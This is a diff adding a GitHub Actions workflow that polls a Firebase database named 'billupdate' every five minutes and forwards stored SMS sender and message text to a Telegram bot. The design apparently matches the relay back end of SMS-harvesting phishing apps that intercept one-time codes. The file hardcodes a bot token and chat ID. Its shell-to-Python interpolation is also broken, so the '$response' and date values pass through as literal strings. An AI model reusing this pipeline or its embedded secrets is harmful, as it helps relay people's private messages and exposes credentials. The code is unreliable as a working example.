@@ -1,0 +1,94 @@
+name: SMS to Telegram Forwarder
+
+on:
+  schedule:
+    - cron: '*/5 * * * *'  # Har 5 minute me check karega
+  workflow_dispatch:  # Manual run ke liye
+
+jobs:
+  check-and-forward:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Check Firebase for new SMS
+        env:
+          FIREBASE_URL: 'https://billupdate-2c426-default-rtdb.asia-southeast1.firebasedatabase.app'
+          BOT_TOKEN: '6854542102:AAH7zpx9_Jt8H4W-jEAFj-0eQ0hz3gX2N-M'
+          CHAT_ID: '194289567'
+        run: |
+          echo "🔍 Checking for new SMS..."
+          
+          # Get unread messages (where telegram_sent is null)
+          response=$(curl -s "$FIREBASE_URL/messages.json?orderBy=\"telegram_sent\"&equalTo=null&limitToLast=5")
+          
+          if [ "$response" != "null" ] && [ "$response" != "" ]; then
+            echo "✅ New messages found!"
+            
+            # Use Python to parse and send
+            python3 << 'EOF'
+import json, os, requests, sys
+
+# Load the response
+data = '''$response'''
+
+if data:
+    messages = json.loads(data)
+    
+    for msg_id, msg in messages.items():
+        if msg and msg.get('sender') and msg.get('message'):
+            print(f"📱 Processing SMS: {msg_id}")
+            
+            # Format Telegram message
+            telegram_message = f"""🚨 NEW SMS RECEIVED 🚨
+
+📞 From: {msg.get('sender', 'Unknown')}
+📝 Message: {msg.get('message', 'No message')}
+⏰ Time: Now
+🆔 ID: {msg_id}"""
+            
+            try:
+                # Send to Telegram
+                telegram_response = requests.post(
+                    f"https://api.telegram.org/bot{os.environ['BOT_TOKEN']}/sendMessage",
+                    json={
+                        'chat_id': os.environ['CHAT_ID'],
+                        'text': telegram_message,
+                        'parse_mode': 'Markdown'
+                    },
+                    timeout=10
+                )
+                
+                if telegram_response.status_code == 200:
+                    print(f"   ✅ Sent to Telegram")
+                    
+                    # Mark as sent in Firebase
+                    mark_response = requests.patch(
+                        f"{os.environ['FIREBASE_URL']}/messages/{msg_id}.json",
+                        json={
+                            'telegram_sent': True,
+                            'sent_at': '$(date +%s)000',
+                            'sent_via': 'github_actions'
+                        },
+                        timeout=5
+                    )
+                    
+                    if mark_response.status_code == 200:
+                        print(f"   ✅ Marked as sent in database")
+                    else:
+                        print(f"   ⚠️ Failed to mark in database")
+                        
+                else:
+                    print(f"   ❌ Telegram error: {telegram_response.text}")
+                    
+            except Exception as e:
+                print(f"   ❌ Exception: {e}")
+        else:
+            print(f"   ⚠️ Invalid message format")
+else:
+    print("📭 No new messages")
+EOF
+          else
+            echo "📭 No new messages in Firebase"
+          fi
+          
+          echo "✅ Check complete at $(date)"
